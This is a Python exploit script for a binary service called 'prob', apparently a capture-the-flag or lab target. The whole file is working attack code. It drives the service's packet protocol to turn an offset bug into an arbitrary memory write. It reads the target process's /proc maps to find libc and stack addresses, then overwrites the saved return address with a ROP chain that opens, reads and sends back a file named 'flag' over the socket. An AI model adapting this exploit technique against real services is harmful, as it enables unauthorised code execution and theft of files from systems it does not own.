#!/usr/bin/env python3
import argparse
import re
import socket
import struct
import subprocess
import sys
import time

# Protocol helpers

def p64(x):
    return struct.pack('<Q', x)

def p32be(x):
    return struct.pack('>I', x)

def pkt(op, payload=b''):
    h = bytearray(16)
    h[0] = 0x80
    h[1] = op
    h[8:12] = p32be(len(payload))
    return bytes(h) + payload

def recvn(s, n):
    out = b''
    while len(out) < n:
        c = s.recv(n - len(out))
        if not c:
            break
        out += c
    return out

def sendpkt(s, op, payload=b'', want_response=True):
    s.sendall(pkt(op, payload))
    if not want_response:
        return b''
    h = recvn(s, 16)
    if len(h) != 16:
        raise EOFError(f'short response: {h!r}')
    length = struct.unpack('>I', h[8:12])[0]
    return h + recvn(s, length)

def set_off(s, off):
    return sendpkt(s, 2, p32be(off))

def arb_write(s, addr, data):
    # The bug: op4 writes to state+0x20+state->off. With off=0x20 this overwrites
    # state->buf. Then op3 writes to state->buf+state->off, i.e. addr.
    set_off(s, 0x20)
    sendpkt(s, 4, p64(addr - 0x20))
    sendpkt(s, 3, data)

# Local helper: parse /proc/<pid>/maps for the forkserver parent.

def parse_maps(pid):
    maps = open(f'/proc/{pid}/maps', 'r', encoding='utf-8').read().splitlines()
    libc_base = None
    mmap_base = None
    stack_end = None
    for i, line in enumerate(maps):
        fields = line.split()
        start_s, end_s = fields[0].split('-')
        start, end = int(start_s, 16), int(end_s, 16)
        path = fields[-1] if len(fields) >= 6 else ''
        if 'libc.so.6' in path and fields[1].startswith('r--p') and fields[2] == '00000000':
            libc_base = start
            # The service mmap(PROT_READ|PROT_WRITE, 0x100000) lands immediately before libc.
            prev = maps[i - 1].split()
            mmap_base = int(prev[0].split('-')[0], 16)
        if '[stack]' in line:
            stack_end = end
    if not (libc_base and mmap_base and stack_end):
        raise RuntimeError('could not parse libc_base/mmap_base/stack_end from maps')
    return libc_base, mmap_base, stack_end

def get_sym(libc_path, name):
    out = subprocess.check_output(['readelf', '-sW', libc_path], text=True)
    pat = re.compile(r'\s+\d+:\s+([0-9a-f]+)\s+\d+\s+FUNC\s+\w+\s+\w+\s+\w+\s+' + re.escape(name) + r'@@')
    for line in out.splitlines():
        m = pat.match(line)
        if m:
            return int(m.group(1), 16)
    raise RuntimeError(f'missing libc symbol: {name}')

def main():
    ap = argparse.ArgumentParser(description='Exploit the prob service locally or with supplied bases.')
    ap.add_argument('host', nargs='?', default='127.0.0.1')
    ap.add_argument('port', nargs='?', type=int, default=5000)
    ap.add_argument('--pid', type=int, help='local parent prob pid; default: newest pgrep prob')
    ap.add_argument('--libc', default='/usr/lib/x86_64-linux-gnu/libc.so.6')
    ap.add_argument('--libc-base', type=lambda x: int(x, 0))
    ap.add_argument('--mmap-base', type=lambda x: int(x, 0))
    ap.add_argument('--saved-rip', type=lambda x: int(x, 0))
    ap.add_argument('--stack-end', type=lambda x: int(x, 0), help='saved_rip is stack_end-0x2f48 for the clean local server')
    args = ap.parse_args()

    libc_base = args.libc_base
    mmap_base = args.mmap_base
    saved_rip = args.saved_rip

    if libc_base is None or mmap_base is None or (saved_rip is None and args.stack_end is None):
        pid = args.pid
        if pid is None:
            pid = int(subprocess.check_output(['pgrep', '-n', 'prob'], text=True).strip())
        libc_base, mmap_base, stack_end = parse_maps(pid)
        if saved_rip is None:
            saved_rip = stack_end - 0x2f48
    elif saved_rip is None:
        saved_rip = args.stack_end - 0x2f48

    print(f'[+] libc_base={libc_base:#x}', file=sys.stderr)
    print(f'[+] mmap_base={mmap_base:#x}', file=sys.stderr)
    print(f'[+] saved_rip={saved_rip:#x}', file=sys.stderr)

    # Gadget offsets from the Ubuntu libc used in this sandbox/Docker-style run.
    # Recompute/replace these for a different libc.
    pop_rdi = libc_base + 0x2a145
    pop_rsi = libc_base + 0x2baa9
    pop_rdx = libc_base + 0xb4baa
    ret     = libc_base + 0x2846b

    open_  = libc_base + get_sym(args.libc, 'open')
    read_  = libc_base + get_sym(args.libc, 'read')
    write_ = libc_base + get_sym(args.libc, 'write')
    exit_  = libc_base + get_sym(args.libc, 'exit')

    filename = mmap_base + 0x100
    buf = mmap_base + 0x300

    s = socket.create_connection((args.host, args.port), timeout=3)

    # Put "flag\0" in the service's RW mmap.
    set_off(s, 0x100)
    sendpkt(s, 3, b'flag\x00')

    # Child closes listening fd 3 before entering the packet loop; open("flag") returns fd 3.
    # The accepted socket is fd 4 in the local/Docker deployment.
    chain = b''.join(map(p64, [
        ret,
        pop_rdi, filename,
        pop_rsi, 0,
        open_,
        pop_rdi, 3,
        pop_rsi, buf,
        pop_rdx, 0x100,
        read_,
        pop_rdi, 4,
        pop_rsi, buf,
        pop_rdx, 0x100,
        write_,
        pop_rdi, 0,
        exit_,
    ]))

    arb_write(s, saved_rip, chain)
    time.sleep(0.1)
    print(s.recv(4096).split(b'\x00')[0].decode(errors='replace'))

if __name__ == '__main__':
    main()
